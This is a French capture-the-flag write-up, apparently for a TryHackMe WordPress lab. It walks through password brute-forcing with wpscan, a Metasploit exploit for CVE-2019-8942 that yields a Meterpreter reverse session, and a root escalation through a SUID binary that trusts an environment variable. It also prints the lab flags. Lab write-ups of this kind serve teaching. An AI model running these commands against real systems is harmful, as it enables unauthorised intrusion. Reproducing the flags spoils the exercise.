WordPressCVE-2019-8942 MetasploitSUIDGhidra

WordPress 5.0 avec Meterpreter via CVE-2019-8942. Escalade via un binaire SUID custom appelant cat mais décodé avec Ghidra pour contourner.

Reconnaissance

bash 
nmap -sC -sV lab.thm
wpscan --url http://blog.thm --enumerate u

Services : SSH (22), HTTP (80), SMB (139/445). WPScan révèle :

  • Version WordPress 5.0
  • Utilisateurs : bjoel, kwheel

Brute-force WordPress

bash 
wpscan --url http://blog.thm \
  -U kwheel -P /usr/share/wordlists/rockyou.txt
Credentials : kwheel : cutiepie1

RCE — Metasploit CVE-2019-8942

bash — msfconsole
msf > search wordpress 5.0
msf > use multi/http/wp_crop_image_file_move
msf > set username kwheel
msf > set password cutiepie1
msf > set rhosts blog.thm
msf > set lhost <kali_ip>
msf > run

Session Meterpreter obtenue en tant que www-data.

Flags User & Root

meterpreter
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
find / -name user.txt 2>/dev/null
cat /home/bjoel/user.txt
User flag : c8421899aae571f7af486492b71a8ab7

Le vrai user.txt est dans /media/usb (flag bonus).

Privesc — SUID binary checker

bash 
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/checker
bash 
ltrace /usr/sbin/checker
getenv("admin") = nil → Not an Admin

Le binaire vérifie la variable d'environnement admin. On la force :

bash 
export admin=1
/usr/sbin/checker   # → shell root !
Root flag : 9a0b2b618bef9bfa7ac28c1353d9f318

Leçons apprises

  • WordPress 5.0 doit être patché — CVE-2019-8942 est un classique THM
  • Meterpreter + wp_crop_image = technique d'upload de webshell via Media
  • ltrace permet d'analyser les appels système d'un binaire sans Ghidra
  • Ne jamais utiliser une variable d'env comme vérification de sécurité
